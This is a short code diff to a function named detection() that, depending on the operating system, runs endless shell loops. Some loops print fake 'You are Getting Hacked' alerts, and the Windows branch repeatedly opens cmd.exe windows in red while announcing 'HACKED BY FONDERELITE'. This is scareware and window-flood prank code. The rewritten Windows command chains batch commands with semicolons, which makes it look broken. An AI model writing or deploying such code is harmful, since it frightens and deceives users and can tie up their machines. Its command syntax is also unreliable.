@@ -55,20 +55,10 @@ void detection(){
 	    system("sleep 2");
        system("while true; do sleep 0.5; echo  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
 	}else if(operating_system == "Windows"){
-	   system("TIMEOUT 2");
-      system("@echo off");
-      system(":loop");
-      system("start cmd.exe");
-      system("color red");
-      system("echo HACKED!!!");
-      system("goto loop");
+	system(":loop; color red; start cmd.exe; echo HACKED BY FONDERELITE!!!; goto loop;");
 	}else if(operating_system == "Android"){
-	 system("sleep 2");
-       system("while true");
-       system("do");
-       system("sleep 0.5");
-       system("echo HIGH ALERT!(You are Getting Hacked By FonderElite.)");
-       system("done");
+	    system("sleep 2");
+       system("while true; do sleep 0.5; echo  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
 	}
 	
 	else{
